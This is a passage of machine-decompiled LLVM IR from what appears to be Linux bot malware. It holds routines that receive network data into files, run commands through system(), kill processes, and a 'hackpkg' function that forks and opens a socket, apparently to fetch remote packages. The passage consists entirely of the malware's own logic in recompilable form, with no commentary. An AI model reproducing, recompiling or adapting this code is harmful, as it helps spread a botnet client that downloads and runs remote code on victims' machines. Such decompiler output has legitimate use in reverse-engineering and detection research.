  br label %dec_label_pc_80540a8

dec_label_pc_805408b:                             ; preds = %dec_label_pc_8054030
  %v0_805408e = load i32, i32* @ebp, align 4
  %v2_805408e = add nsw i32 %storemerge161, -5224
  %v3_805408e = add i32 %v2_805408e, %v0_805408e
  %v4_805408e = inttoptr i32 %v3_805408e to i8*
  %v5_805408e = load i8, i8* %v4_805408e, align 1
  %v2_8054096 = sext i8 %v5_805408e to i32
  store i32 %v2_8054096, i32* @edx, align 4
  %v5_80540a3 = call i32 @__GI_fputc(i8 %v5_805408e, i32 %v4_8053e91)
  br label %dec_label_pc_80540a8

dec_label_pc_80540a8:                             ; preds = %dec_label_pc_805406c, %dec_label_pc_8054050, %dec_label_pc_805408b
  %v4_80540a8 = add nuw nsw i32 %storemerge161, 1
  %v10_80540ae = icmp ult i32 %v4_80540a8, %v6_8054001166
  store i1 %v10_80540ae, i1* %cf.global-to-local, align 1
  %exitcond197 = icmp eq i32 %v4_80540a8, %v6_8054001166
  br i1 %exitcond197, label %dec_label_pc_8053fe1.loopexit, label %dec_label_pc_8054030

dec_label_pc_80540bc:                             ; preds = %dec_label_pc_8053fe1.loopexit, %dec_label_pc_8053fe1.preheader
  %tmp101 = inttoptr i32 %v4_8053e91 to i16*
  %v3_80540c2 = call i32 @__GI_fclose(i16* %tmp101)
  %v2_80540d7 = ptrtoint i32* %stack_var_-1132 to i32
  %tmp102 = bitcast i32* %stack_var_-1132 to i8*
  %v6_80540e0 = call i32 @__GI_memset(i8* %tmp102, i32 0, i32 4096)
  %v4_805410d = call i32 @sprintf(i32 %v2_80540d7, i32 ptrtoint ([70 x i8]* @global_var_806b5b4.441 to i32))
  br label %dec_label_pc_805439c

dec_label_pc_8054117:                             ; preds = %dec_label_pc_8053e2c
  %v4_8054126 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806b5fa.442 to i32), i32 ptrtoint ([3 x i8]* @global_var_8069878.45 to i32))
  %v2_805413e = ptrtoint i32* %stack_var_-5228 to i32
  %v6_805414e147 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_805413e, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp103150 = icmp slt i32 %v6_805414e147, 1
  br i1 %tmp103150, label %dec_label_pc_8054276.preheader.loopexit23, label %dec_label_pc_8054160

dec_label_pc_805412e.loopexit:                    ; preds = %dec_label_pc_8054262
  %v6_805414e = call i32 @recv(i32 %v5_8053bf2, i32 %v2_805413e, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp103 = icmp slt i32 %v6_805414e, 1
  br i1 %tmp103, label %dec_label_pc_8054276.preheader.loopexit23, label %dec_label_pc_8054160

dec_label_pc_8054160:                             ; preds = %dec_label_pc_8054117, %dec_label_pc_805412e.loopexit
  %v6_805414e151 = phi i32 [ %v6_805414e, %dec_label_pc_805412e.loopexit ], [ %v6_805414e147, %dec_label_pc_8054117 ]
  %v4_8054160 = add i32 %v6_805414e151, -4095
  %v8_8054160 = icmp ult i32 %v6_805414e151, 4095
  %v9_8054160 = sub i32 4094, %v6_805414e151
  %v10_8054160 = and i32 %v9_8054160, %v6_805414e151
  %v11_8054160 = icmp slt i32 %v10_8054160, 0
  store i1 %v8_8054160, i1* %cf.global-to-local, align 1
  %v12_8054160 = icmp eq i32 %v4_8054160, 0
  %v13_8054160 = icmp slt i32 %v4_8054160, 0
  %v3_8054167 = icmp eq i1 %v13_8054160, %v11_8054160
  %v4_8054167 = icmp eq i1 %v12_8054160, false
  %v5_8054167 = and i1 %v4_8054167, %v3_8054167
  br i1 %v5_8054167, label %dec_label_pc_8054180.lr.ph, label %dec_label_pc_8054169

dec_label_pc_8054169:                             ; preds = %dec_label_pc_8054160
  %v0_805416c = load i32, i32* @ebp, align 4
  %v2_805416c = add i32 %v6_805414e151, -5224
  %v3_805416c = add i32 %v2_805416c, %v0_805416c
  %v4_805416c = inttoptr i32 %v3_805416c to i8*
  store i8 0, i8* %v4_805416c, align 1
  br label %dec_label_pc_8054180.lr.ph

dec_label_pc_8054180.lr.ph:                       ; preds = %dec_label_pc_8054169, %dec_label_pc_8054160
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8054180

dec_label_pc_8054180:                             ; preds = %dec_label_pc_8054180.lr.ph, %dec_label_pc_8054262
  %storemerge10146 = phi i32 [ 0, %dec_label_pc_8054180.lr.ph ], [ %v4_8054262, %dec_label_pc_8054262 ]
  store i32 %storemerge10146, i32* %edx.global-to-local, align 4
  %v2_805418b = add i32 %storemerge10146, %v2_805413e
  %v7_805418b = icmp ult i32 %v2_805418b, %v2_805413e
  store i1 %v7_805418b, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_80541a8 = inttoptr i32 %v2_805418b to i8*
  store i32 %v2_805418b, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_806987b.46 to i32), i32* @edi, align 4
  %v7_80541ba = call i32 @_strncmp(i8* %v4_80541a8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806987b.46, i32 0, i32 0), i32 4)
  %v8_80541ba = urem i32 %v7_80541ba, 2
  %v9_80541ba = icmp eq i32 %v8_80541ba, 0
  %v0_80541bc = load i1, i1* %cf.global-to-local, align 1
  %v2_80541bc = or i1 %v0_80541bc, %v9_80541ba
  %v3_80541bc = zext i1 %v2_80541bc to i32
  %v4_80541bc = load i32, i32* %edx.global-to-local, align 4
  %v5_80541bc = and i32 %v4_80541bc, -256
  %v6_80541bc = or i32 %v3_80541bc, %v5_80541bc
  %v7_80541bc = xor i32 %v6_80541bc, 1
  store i32 %v7_80541bc, i32* %edx.global-to-local, align 4
  %v3_80541c2 = and i32 %v7_80541ba, -256
  %v1_80541c4 = trunc i32 %v7_80541bc to i8
  %v3_80541c4 = zext i1 %v0_80541bc to i8
  %v4_80541c4 = sub nsw i8 %v1_80541c4, %v3_80541c4
  %v15_80541c4 = icmp eq i8 %v4_80541c4, 0
  %v20_80541c4 = zext i8 %v4_80541c4 to i32
  %v23_80541c4 = or i32 %v20_80541c4, %v3_80541c2
  store i32 %v23_80541c4, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80541cd = icmp eq i1 %v15_80541c4, false
  br i1 %v1_80541cd, label %dec_label_pc_8054262, label %dec_label_pc_80541d3

dec_label_pc_80541d3:                             ; preds = %dec_label_pc_8054180
  %v4_80541d3 = add i32 %storemerge10146, 4
  %v1_80541e2 = add i32 %v4_8054126, 52
  %v2_80541e2 = inttoptr i32 %v1_80541e2 to i32*
  %v1_80541ec = add i32 %v4_8054126, 16
  %v2_80541ec = inttoptr i32 %v1_80541ec to i32*
  %v1_80541f2 = add i32 %v4_8054126, 28
  %v2_80541f2 = inttoptr i32 %v1_80541f2 to i32*
  %v10_8054257128 = icmp ult i32 %v4_80541d3, %v6_805414e151
  store i1 %v10_8054257128, i1* %cf.global-to-local, align 1
  %v5_805425a135 = icmp slt i32 %v4_80541d3, %v6_805414e151
  br i1 %v5_805425a135, label %dec_label_pc_80541d9, label %dec_label_pc_8054276.preheader

dec_label_pc_80541d9:                             ; preds = %dec_label_pc_80541d3, %dec_label_pc_8054251
  %storemerge20.in136 = phi i32 [ %v4_8054251, %dec_label_pc_8054251 ], [ %v4_80541d3, %dec_label_pc_80541d3 ]
  %v3_80541e2 = load i32, i32* %v2_80541e2, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80541e5 = icmp eq i32 %v3_80541e2, 0
  br i1 %v1_80541e5, label %dec_label_pc_8054234, label %dec_label_pc_80541e9

dec_label_pc_80541e9:                             ; preds = %dec_label_pc_80541d9
  %v3_80541ec = load i32, i32* %v2_80541ec, align 4
  store i32 %v3_80541ec, i32* %edx.global-to-local, align 4
  %v3_80541f2 = load i32, i32* %v2_80541f2, align 4
  %v7_80541f5 = icmp ult i32 %v3_80541ec, %v3_80541f2
  store i1 %v7_80541f5, i1* %cf.global-to-local, align 1
  %v1_80541f7 = icmp eq i1 %v7_80541f5, false
  br i1 %v1_80541f7, label %dec_label_pc_8054215, label %dec_label_pc_80541f9

dec_label_pc_80541f9:                             ; preds = %dec_label_pc_80541e9
  %v3_80541fc = load i32, i32* %v2_80541ec, align 4
  store i32 %v3_80541fc, i32* %edx.global-to-local, align 4
  %v0_8054202 = load i32, i32* @ebp, align 4
  %v2_8054202 = add i32 %storemerge20.in136, -5224
  %v3_8054202 = add i32 %v2_8054202, %v0_8054202
  %v4_8054202 = inttoptr i32 %v3_8054202 to i8*
  %v5_8054202 = load i8, i8* %v4_8054202, align 1
  %v3_805420a = inttoptr i32 %v3_80541fc to i8*
  store i8 %v5_8054202, i8* %v3_805420a, align 1
  %v0_805420c = load i32, i32* %edx.global-to-local, align 4
  %v1_805420c = add i32 %v0_805420c, 1
  store i32 %v1_805420c, i32* %edx.global-to-local, align 4
  store i32 %v1_805420c, i32* %v2_80541ec, align 4
  br label %dec_label_pc_8054251

dec_label_pc_8054215:                             ; preds = %dec_label_pc_80541e9
  %v0_8054218 = load i32, i32* @ebp, align 4
  %v2_8054218 = add i32 %storemerge20.in136, -5224
  %v3_8054218 = add i32 %v2_8054218, %v0_8054218
  %v4_8054218 = inttoptr i32 %v3_8054218 to i8*
  %v5_8054218 = load i8, i8* %v4_8054218, align 1
  %v6_8054218 = zext i8 %v5_8054218 to i32
  store i32 %v6_8054218, i32* @edx, align 4
  %v5_805422d = call i32 @putc_unlocked(i8 %v5_8054218, i32 %v4_8054126)
  br label %dec_label_pc_8054251

dec_label_pc_8054234:                             ; preds = %dec_label_pc_80541d9
  %v0_8054237 = load i32, i32* @ebp, align 4
  %v2_8054237 = add i32 %storemerge20.in136, -5224
  %v3_8054237 = add i32 %v2_8054237, %v0_8054237
  %v4_8054237 = inttoptr i32 %v3_8054237 to i8*
  %v5_8054237 = load i8, i8* %v4_8054237, align 1
  %v6_8054237 = zext i8 %v5_8054237 to i32
  store i32 %v6_8054237, i32* @edx, align 4
  %v5_805424c = call i32 @__GI_fputc(i8 %v5_8054237, i32 %v4_8054126)
  br label %dec_label_pc_8054251

dec_label_pc_8054251:                             ; preds = %dec_label_pc_8054215, %dec_label_pc_80541f9, %dec_label_pc_8054234
  %v4_8054251 = add i32 %storemerge20.in136, 1
  %v10_8054257 = icmp ult i32 %v4_8054251, %v6_805414e151
  store i1 %v10_8054257, i1* %cf.global-to-local, align 1
  %exitcond196 = icmp eq i32 %v4_8054251, %v6_805414e151
  br i1 %exitcond196, label %dec_label_pc_8054276.preheader, label %dec_label_pc_80541d9

dec_label_pc_8054276.preheader.loopexit23:        ; preds = %dec_label_pc_805412e.loopexit, %dec_label_pc_8054117
  %.pre39 = add i32 %v4_8054126, 52
  %.pre40 = inttoptr i32 %.pre39 to i32*
  %.pre41 = add i32 %v4_8054126, 16
  %.pre42 = inttoptr i32 %.pre41 to i32*
  %.pre43 = add i32 %v4_8054126, 28
  %.pre44 = inttoptr i32 %.pre43 to i32*
  br label %dec_label_pc_8054276.preheader

dec_label_pc_8054276.preheader:                   ; preds = %dec_label_pc_80541d3, %dec_label_pc_8054251, %dec_label_pc_8054276.preheader.loopexit23
  %v2_80542de.pre-phi = phi i32* [ %.pre44, %dec_label_pc_8054276.preheader.loopexit23 ], [ %v2_80541f2, %dec_label_pc_8054251 ], [ %v2_80541f2, %dec_label_pc_80541d3 ]
  %v2_80542d8.pre-phi = phi i32* [ %.pre42, %dec_label_pc_8054276.preheader.loopexit23 ], [ %v2_80541ec, %dec_label_pc_8054251 ], [ %v2_80541ec, %dec_label_pc_80541d3 ]
  %v2_80542ce.pre-phi = phi i32* [ %.pre40, %dec_label_pc_8054276.preheader.loopexit23 ], [ %v2_80541e2, %dec_label_pc_8054251 ], [ %v2_80541e2, %dec_label_pc_80541d3 ]
  %v6_8054296122 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_805413e, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp104125 = icmp slt i32 %v6_8054296122, 1
  br i1 %tmp104125, label %dec_label_pc_8054351, label %dec_label_pc_80542a8

dec_label_pc_8054262:                             ; preds = %dec_label_pc_8054180
  %v4_8054262 = add nuw nsw i32 %storemerge10146, 1
  %v10_8054268 = icmp ult i32 %v4_8054262, %v6_805414e151
  store i1 %v10_8054268, i1* %cf.global-to-local, align 1
  %v5_805426b = icmp slt i32 %v4_8054262, %v6_805414e151
  br i1 %v5_805426b, label %dec_label_pc_8054180, label %dec_label_pc_805412e.loopexit

dec_label_pc_8054276.loopexit:                    ; preds = %dec_label_pc_805433d
  %v6_8054296 = call i32 @recv(i32 %v5_8053bf2, i32 %v2_805413e, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp104 = icmp slt i32 %v6_8054296, 1
  br i1 %tmp104, label %dec_label_pc_8054351, label %dec_label_pc_80542a8

dec_label_pc_80542a8:                             ; preds = %dec_label_pc_8054276.preheader, %dec_label_pc_8054276.loopexit
  %v6_8054296126 = phi i32 [ %v6_8054296, %dec_label_pc_8054276.loopexit ], [ %v6_8054296122, %dec_label_pc_8054276.preheader ]
  %v4_80542a8 = add i32 %v6_8054296126, -4095
  %v8_80542a8 = icmp ult i32 %v6_8054296126, 4095
  %v9_80542a8 = sub i32 4094, %v6_8054296126
  %v10_80542a8 = and i32 %v9_80542a8, %v6_8054296126
  %v11_80542a8 = icmp slt i32 %v10_80542a8, 0
  store i1 %v8_80542a8, i1* %cf.global-to-local, align 1
  %v12_80542a8 = icmp eq i32 %v4_80542a8, 0
  %v13_80542a8 = icmp slt i32 %v4_80542a8, 0
  %v3_80542af = icmp eq i1 %v13_80542a8, %v11_80542a8
  %v4_80542af = icmp eq i1 %v12_80542a8, false
  %v5_80542af = and i1 %v4_80542af, %v3_80542af
  br i1 %v5_80542af, label %dec_label_pc_80542c5.lr.ph, label %dec_label_pc_80542b1

dec_label_pc_80542b1:                             ; preds = %dec_label_pc_80542a8
  %v0_80542b4 = load i32, i32* @ebp, align 4
  %v2_80542b4 = add i32 %v6_8054296126, -5224
  %v3_80542b4 = add i32 %v2_80542b4, %v0_80542b4
  %v4_80542b4 = inttoptr i32 %v3_80542b4 to i8*
  store i8 0, i8* %v4_80542b4, align 1
  br label %dec_label_pc_80542c5.lr.ph

dec_label_pc_80542c5.lr.ph:                       ; preds = %dec_label_pc_80542b1, %dec_label_pc_80542a8
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80542c5

dec_label_pc_80542c5:                             ; preds = %dec_label_pc_805433d, %dec_label_pc_80542c5.lr.ph
  %storemerge7121 = phi i32 [ 0, %dec_label_pc_80542c5.lr.ph ], [ %v4_805433d, %dec_label_pc_805433d ]
  %v3_80542ce = load i32, i32* %v2_80542ce.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80542d1 = icmp eq i32 %v3_80542ce, 0
  br i1 %v1_80542d1, label %dec_label_pc_8054320, label %dec_label_pc_80542d5

dec_label_pc_80542d5:                             ; preds = %dec_label_pc_80542c5
  %v3_80542d8 = load i32, i32* %v2_80542d8.pre-phi, align 4
  store i32 %v3_80542d8, i32* %edx.global-to-local, align 4
  %v3_80542de = load i32, i32* %v2_80542de.pre-phi, align 4
  %v7_80542e1 = icmp ult i32 %v3_80542d8, %v3_80542de
  store i1 %v7_80542e1, i1* %cf.global-to-local, align 1
  %v1_80542e3 = icmp eq i1 %v7_80542e1, false
  br i1 %v1_80542e3, label %dec_label_pc_8054301, label %dec_label_pc_80542e5

dec_label_pc_80542e5:                             ; preds = %dec_label_pc_80542d5
  %v3_80542e8 = load i32, i32* %v2_80542d8.pre-phi, align 4
  store i32 %v3_80542e8, i32* %edx.global-to-local, align 4
  %v0_80542ee = load i32, i32* @ebp, align 4
  %v2_80542ee = add nsw i32 %storemerge7121, -5224
  %v3_80542ee = add i32 %v2_80542ee, %v0_80542ee
  %v4_80542ee = inttoptr i32 %v3_80542ee to i8*
  %v5_80542ee = load i8, i8* %v4_80542ee, align 1
  %v3_80542f6 = inttoptr i32 %v3_80542e8 to i8*
  store i8 %v5_80542ee, i8* %v3_80542f6, align 1
  %v0_80542f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80542f8 = add i32 %v0_80542f8, 1
  store i32 %v1_80542f8, i32* %edx.global-to-local, align 4
  store i32 %v1_80542f8, i32* %v2_80542d8.pre-phi, align 4
  br label %dec_label_pc_805433d

dec_label_pc_8054301:                             ; preds = %dec_label_pc_80542d5
  %v0_8054304 = load i32, i32* @ebp, align 4
  %v2_8054304 = add nsw i32 %storemerge7121, -5224
  %v3_8054304 = add i32 %v2_8054304, %v0_8054304
  %v4_8054304 = inttoptr i32 %v3_8054304 to i8*
  %v5_8054304 = load i8, i8* %v4_8054304, align 1
  %v6_8054304 = zext i8 %v5_8054304 to i32
  store i32 %v6_8054304, i32* @edx, align 4
  %v5_8054319 = call i32 @putc_unlocked(i8 %v5_8054304, i32 %v4_8054126)
  br label %dec_label_pc_805433d

dec_label_pc_8054320:                             ; preds = %dec_label_pc_80542c5
  %v0_8054323 = load i32, i32* @ebp, align 4
  %v2_8054323 = add nsw i32 %storemerge7121, -5224
  %v3_8054323 = add i32 %v2_8054323, %v0_8054323
  %v4_8054323 = inttoptr i32 %v3_8054323 to i8*
  %v5_8054323 = load i8, i8* %v4_8054323, align 1
  %v6_8054323 = zext i8 %v5_8054323 to i32
  store i32 %v6_8054323, i32* @edx, align 4
  %v5_8054338 = call i32 @__GI_fputc(i8 %v5_8054323, i32 %v4_8054126)
  br label %dec_label_pc_805433d

dec_label_pc_805433d:                             ; preds = %dec_label_pc_8054301, %dec_label_pc_80542e5, %dec_label_pc_8054320
  %v4_805433d = add nuw nsw i32 %storemerge7121, 1
  %v10_8054343 = icmp ult i32 %v4_805433d, %v6_8054296126
  store i1 %v10_8054343, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_805433d, %v6_8054296126
  br i1 %exitcond, label %dec_label_pc_8054276.loopexit, label %dec_label_pc_80542c5

dec_label_pc_8054351:                             ; preds = %dec_label_pc_8054276.loopexit, %dec_label_pc_8054276.preheader
  %tmp105 = inttoptr i32 %v4_8054126 to i16*
  %v3_8054357 = call i32 @__GI_fclose(i16* %tmp105)
  %v2_805436c = ptrtoint i32* %stack_var_-1132 to i32
  %tmp106 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8054375 = call i32 @__GI_memset(i8* %tmp106, i32 0, i32 4096)
  store i32 ptrtoint ([188 x i8]* @global_var_806b604.443 to i32), i32* %edx.global-to-local, align 4
  %tmp107 = bitcast i32* %stack_var_-1132 to i16*
  %v6_8054397 = call i32 @memcpy(i16* %tmp107, i32 ptrtoint ([188 x i8]* @global_var_806b604.443 to i32), i32 188)
  br label %dec_label_pc_805439c

dec_label_pc_805439c:                             ; preds = %dec_label_pc_80540bc, %dec_label_pc_8054351
  %v2_80543b2.pre-phi = phi i32 [ %v2_80540d7, %dec_label_pc_80540bc ], [ %v2_805436c, %dec_label_pc_8054351 ]
  %v2_80543a2 = call i32 @close(i32 %arg1)
  %v2_80543ad = call i32 @close(i32 %v5_8053bf2)
  %v2_80543bb = call i32 @system(i32 %v2_80543b2.pre-phi)
  %v4_80543cf = call i32 @kill(i32 9, i32 0)
  %v2_80543db = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80543e0

dec_label_pc_80543e0:                             ; preds = %entry, %dec_label_pc_805439c
  %v0_80543e9 = phi i32 [ %v2_8053ba2, %entry ], [ %v2_80543db, %dec_label_pc_805439c ]
  %v0_80543e0 = load i32, i32* @esp, align 4
  %v2_80543e0 = icmp ugt i32 %v0_80543e0, -5265
  store i1 %v2_80543e0, i1* %cf.global-to-local, align 1
  ret i32 %v0_80543e9

; uselistorder directives
  uselistorder i32 %storemerge7121, { 0, 3, 2, 1 }
  uselistorder i32 %v4_80542a8, { 1, 0 }
  uselistorder i32 %v6_8054296126, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32 %v4_8054262, { 1, 0, 2 }
  uselistorder i32* %v2_80542d8.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8054251, { 1, 2, 0 }
  uselistorder i32 %storemerge20.in136, { 0, 3, 2, 1 }
  uselistorder i1 %v0_80541bc, { 1, 0 }
  uselistorder i32 %v7_80541ba, { 1, 0 }
  uselistorder i32 %storemerge10146, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8054160, { 1, 0 }
  uselistorder i32 %v6_805414e151, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_805413e, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v4_8054126, { 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %storemerge161, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8054013, { 1, 0 }
  uselistorder i32 %v6_8054001166, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32 %v4_8053fcd, { 1, 0, 2 }
  uselistorder i32* %v2_8054043.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8053fbc, { 1, 2, 0 }
  uselistorder i32 %storemerge19.in176, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8053f27, { 1, 0 }
  uselistorder i32 %v7_8053f25, { 1, 0 }
  uselistorder i32 %storemerge6186, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8053ecb, { 1, 0 }
  uselistorder i32 %v6_8053eb9191, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8053ea9, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 %v4_8053e91, { 10, 9, 8, 0, 1, 2, 6, 3, 5, 4, 7 }
  uselistorder i32 %storemerge12, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8053c4a, { 1, 0, 2 }
  uselistorder i1 %v5_8053c42, { 1, 0, 2 }
  uselistorder i32 %v5_8053bf2, { 7, 8, 4, 9, 3, 5, 2, 6, 1, 10, 11, 0, 12 }
  uselistorder i32 %v4_8053baf, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-104, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1132, { 0, 1, 4, 2, 5, 3, 6 }
  uselistorder i1* %cf.global-to-local, { 10, 13, 11, 12, 0, 14, 15, 22, 1, 18, 16, 17, 2, 19, 20, 21, 3, 23, 24, 4, 27, 25, 26, 5, 28, 29, 36, 6, 32, 30, 31, 7, 33, 34, 35, 8, 37, 38, 9, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 (i32, i8*)* @strstr, { 1, 0 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80543e0, { 1, 0 }
  uselistorder label %dec_label_pc_805439c, { 1, 0 }
  uselistorder label %dec_label_pc_805433d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80542a8, { 1, 0 }
  uselistorder label %dec_label_pc_8054276.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054251, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80541d9, { 1, 0 }
  uselistorder label %dec_label_pc_8054180, { 1, 0 }
  uselistorder label %dec_label_pc_8054160, { 1, 0 }
  uselistorder label %dec_label_pc_80540a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054013, { 1, 0 }
  uselistorder label %dec_label_pc_8053fe1.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053fbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053f44, { 1, 0 }
  uselistorder label %dec_label_pc_8053eeb, { 1, 0 }
  uselistorder label %dec_label_pc_8053ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8053e2c, { 1, 0 }
  uselistorder label %dec_label_pc_8053db7, { 1, 0 }
  uselistorder label %dec_label_pc_8053d1e, { 1, 0 }
  uselistorder label %dec_label_pc_8053cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8053c97, { 1, 0 }
  uselistorder label %dec_label_pc_8053c26, { 1, 0 }
  uselistorder label %dec_label_pc_8053bdb, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp10 = icmp slt i32 %arg3, 1
  %tmp11 = icmp eq i1 %tmp10, false
  br i1 %tmp11, label %dec_label_pc_805441c, label %dec_label_pc_80543f6

dec_label_pc_80543f6:                             ; preds = %entry
  %v3_805440b = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_806b6c0.444 to i32))
  %v1_8054417 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_805441c

dec_label_pc_805441c:                             ; preds = %entry, %dec_label_pc_80543f6
  %v1_805441f = add i32 %arg4, 4
  %v1_8054422 = inttoptr i32 %v1_805441f to i32*
  %v2_8054422 = load i32, i32* %v1_8054422, align 4
  %v1_8054427 = inttoptr i32 %v2_8054422 to i8*
  %v2_8054427 = call i32 @__GI_strdup(i8* %v1_8054427)
  store i32 %v2_8054427, i32* @global_var_807e2e4.445, align 4
  store i32 1, i32* @global_var_80756c4.446, align 4
  %v1_8054441 = call i32 @close(i32 %arg1)
  ret i32 %v1_8054441

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805441c, { 1, 0 }
}

define i32 @hackpkg(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-6212 = alloca i32, align 4
  %stack_var_-5957 = alloca i32, align 4
  %stack_var_-5702 = alloca i32, align 4
  %stack_var_-5447 = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805444c = load i32, i32* @esi, align 4
  store i32 %v0_805444c, i32* %stack_var_-12, align 4
  %v2_805444d = icmp ult i32* %stack_var_-12, inttoptr (i32 6256 to i32*)
  store i1 %v2_805444d, i1* %cf.global-to-local, align 1
  %v5_8054462 = call i32 @mkdir(i32 ptrtoint ([9 x i8]* @global_var_806b6da.447 to i32), i16 509)
  %v2_805446d = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8054472 = icmp eq i32 %v2_805446d, 0
  %v1_8054474 = icmp eq i1 %v1_8054472, false
  br i1 %v1_8054474, label %dec_label_pc_8054a53, label %dec_label_pc_805447a

dec_label_pc_805447a:                             ; preds = %entry
  %v4_805447a = add i32 %arg3, -1
  %v8_805447a = icmp eq i32 %arg3, 0
  %v9_805447a = sub i32 0, %arg3
  %v10_805447a = and i32 %arg3, %v9_805447a
  %v11_805447a = icmp slt i32 %v10_805447a, 0
  store i1 %v8_805447a, i1* %cf.global-to-local, align 1
  %v12_805447a = icmp eq i32 %v4_805447a, 0
  %v13_805447a = icmp slt i32 %v4_805447a, 0
  %v3_805447e = icmp eq i1 %v13_805447a, %v11_805447a
  %v4_805447e = icmp eq i1 %v12_805447a, false
  %v5_805447e = and i1 %v4_805447e, %v3_805447e
  br i1 %v5_805447e, label %dec_label_pc_80544a6, label %dec_label_pc_8054480

dec_label_pc_8054480:                             ; preds = %dec_label_pc_805447a
  %v4_8054495 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806b6e4.448 to i32))
  %v2_80544a1 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80544a6

dec_label_pc_80544a6:                             ; preds = %dec_label_pc_805447a, %dec_label_pc_8054480
  %v5_80544bd = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_80544c5 = icmp ne i32 %v5_80544bd, -1
  store i1 %v8_80544c5, i1* %cf.global-to-local, align 1
  %v13_80544c5 = icmp eq i32 %v5_80544bd, -1
  %v1_80544c9 = icmp eq i1 %v13_80544c5, false
  br i1 %v1_80544c9, label %dec_label_pc_80544f1, label %dec_label_pc_80544cb

dec_label_pc_80544cb:                             ; preds = %dec_label_pc_80544a6
  %v4_80544e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_80696c8.39 to i32))
  %v2_80544ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80544f1

dec_label_pc_80544f1:                             ; preds = %dec_label_pc_80544a6, %dec_label_pc_80544cb
  %v1_80544f4 = add i32 %arg4, 4
  %v5_80544f4 = icmp ugt i32 %arg4, -5
  store i1 %v5_80544f4, i1* %cf.global-to-local, align 1
  %v1_80544f7 = inttoptr i32 %v1_80544f4 to i32*
  %v2_80544f7 = load i32, i32* %v1_80544f7, align 4
  store i1 false, i1* @df, align 1
  %v4_8054514 = inttoptr i32 %v2_80544f7 to i8*
  store i32 %v2_80544f7, i32* @esi, align 4
  %v7_8054526 = call i32 @_strncmp(i8* %v4_8054514, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80696ed.40, i32 0, i32 0), i32 7)
  %v8_8054526 = urem i32 %v7_8054526, 2
  %v9_8054526 = icmp eq i32 %v8_8054526, 0
  %v0_8054528 = load i1, i1* %cf.global-to-local, align 1
  %v2_8054528 = or i1 %v0_8054528, %v9_8054526
  %v3_8054528 = zext i1 %v2_8054528 to i32
  %v4_8054528 = load i32, i32* @edx, align 4
